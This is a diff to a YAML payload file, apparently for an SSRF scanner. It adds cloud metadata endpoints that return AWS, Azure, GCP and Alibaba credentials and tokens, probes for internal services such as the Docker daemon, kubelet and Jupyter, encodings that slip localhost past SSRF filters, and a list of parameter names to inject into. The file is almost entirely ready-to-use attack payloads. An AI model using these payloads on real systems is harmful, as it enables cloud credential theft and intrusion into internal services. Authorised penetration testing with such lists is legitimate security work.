@@ -9,21 +9,45 @@ cloud_payloads:
   - url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
     signatures: ["AccessKeyId", "SecretAccessKey"]
     label: "AWS IAM credentials"
+  - url: "http://169.254.169.254/latest/meta-data/hostname"
+    signatures: ["amazonaws.com", "ec2.internal"]
+    label: "AWS EC2 hostname"
+  - url: "http://169.254.169.254/latest/meta-data/public-ipv4"
+    signatures: [".", ""]
+    label: "AWS public IP"
+  - url: "http://169.254.169.254/latest/dynamic/instance-identity/document"
+    signatures: ["accountId", "instanceId", "region"]
+    label: "AWS instance identity"
+  - url: "http://169.254.169.254/latest/user-data"
+    signatures: ["#!/", "cloud-init", "#cloud-config"]
+    label: "AWS user-data"
   - url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
     signatures: ["compute", "vmId", "subscriptionId"]
     label: "Azure IMDS"
+  - url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+    signatures: ["access_token", "token_type"]
+    label: "Azure managed identity token"
   - url: "http://metadata.google.internal/computeMetadata/v1/"
     signatures: ["computeMetadata", "project", "instance"]
     label: "GCP metadata"
   - url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
     signatures: ["access_token", "token_type"]
     label: "GCP service account token"
+  - url: "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+    signatures: ["gcp", "google", "-"]
+    label: "GCP project ID"
   - url: "http://100.100.100.200/latest/meta-data/"
     signatures: ["instance-id", "ami-id"]
     label: "Alibaba Cloud IMDS"
-  - url: "http://169.254.169.254/latest/user-data"
-    signatures: ["#!/", "cloud-init", "#cloud-config"]
-    label: "AWS user-data"
+  - url: "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+    signatures: ["AccessKeyId", "SecretAccessKey"]
+    label: "Alibaba Cloud RAM credentials"
+  - url: "http://192.168.0.1/"
+    signatures: ["router", "gateway", "admin"]
+    label: "Router admin panel"
+  - url: "http://10.0.0.1/"
+    signatures: ["admin", "router", "home"]
+    label: "Internal gateway"
 
 # Internal services — no signatures needed (HTTP 200 with content = candidate)
 internal_payloads:
@@ -39,6 +63,9 @@ internal_payloads:
   - url: "http://127.0.0.1:8080/"
     signatures: ~
     label: "localhost:8080"
+  - url: "http://127.0.0.1:8443/"
+    signatures: ~
+    label: "localhost:8443"
   - url: "http://127.0.0.1:9200/"
     signatures: ["elasticsearch", "cluster_name"]
     label: "Elasticsearch"
@@ -57,6 +84,66 @@ internal_payloads:
   - url: "http://127.0.0.1:5432/"
     signatures: ["postgresql", "PostgreSQL"]
     label: "PostgreSQL"
+  - url: "http://127.0.0.1:11211/"
+    signatures: ["VERSION", "STAT"]
+    label: "Memcached"
+  - url: "http://127.0.0.1:4369/"
+    signatures: ["rabbit", "erlang"]
+    label: "RabbitMQ epmd"
+  - url: "http://127.0.0.1:15672/"
+    signatures: ["RabbitMQ", "Management"]
+    label: "RabbitMQ management"
+  - url: "http://127.0.0.1:2375/"
+    signatures: ["containers", "images", "Docker"]
+    label: "Docker daemon"
+  - url: "http://127.0.0.1:2376/"
+    signatures: ["containers", "images", "Docker"]
+    label: "Docker TLS daemon"
+  - url: "http://127.0.0.1:10250/"
+    signatures: ["kubelet", "pods", "nodes"]
+    label: "Kubernetes kubelet"
+  - url: "http://127.0.0.1:8001/"
+    signatures: ["apis", "namespaces", "kubernetes"]
+    label: "Kubernetes API proxy"
+  - url: "http://127.0.0.1:4040/"
+    signatures: ["ngrok", "Tunnel"]
+    label: "ngrok"
+  - url: "http://127.0.0.1:3000/"
+    signatures: ~
+    label: "dev server :3000"
+  - url: "http://127.0.0.1:4000/"
+    signatures: ~
+    label: "dev server :4000"
+  - url: "http://127.0.0.1:5000/"
+    signatures: ~
+    label: "dev server :5000"
+  - url: "http://127.0.0.1:8888/"
+    signatures: ["Jupyter", "jupyter"]
+    label: "Jupyter Notebook"
+
+# Bypass encodings for common SSRF filters
+bypass_payloads:
+  - url: "http://2130706433/"
+    label: "127.0.0.1 decimal"
+    signatures: ~
+  - url: "http://0x7f000001/"
+    label: "127.0.0.1 hex"
+    signatures: ~
+  - url: "http://127.1/"
+    label: "127.1 short form"
+    signatures: ~
+  - url: "http://[::1]/"
+    label: "IPv6 localhost"
+    signatures: ~
+  - url: "http://[::ffff:127.0.0.1]/"
+    label: "IPv6-mapped IPv4"
+    signatures: ~
+  - url: "http://①②⑦.⓪.⓪.⓪/"
+    label: "Unicode lookalike"
+    signatures: ~
+  - url: "http://127.0.0.1.nip.io/"
+    label: "nip.io wildcard DNS"
+    signatures: ~
 
 # URL params that suggest SSRF entry points
 ssrf_params:
@@ -80,3 +167,30 @@ ssrf_params:
   - returnurl
   - goto
   - forward
+  - resource
+  - host
+  - endpoint
+  - domain
+  - data
+  - feed
+  - site
+  - html
+  - open
+  - continue
+  - window
+  - dir
+  - show
+  - navigation
+  - view
+  - page
+  - ref
+  - val
+  - validate
+  - origin
+  - img_url
+  - image_url
+  - avatar
+  - logo
+  - webhook
+  - hook
+  - ping
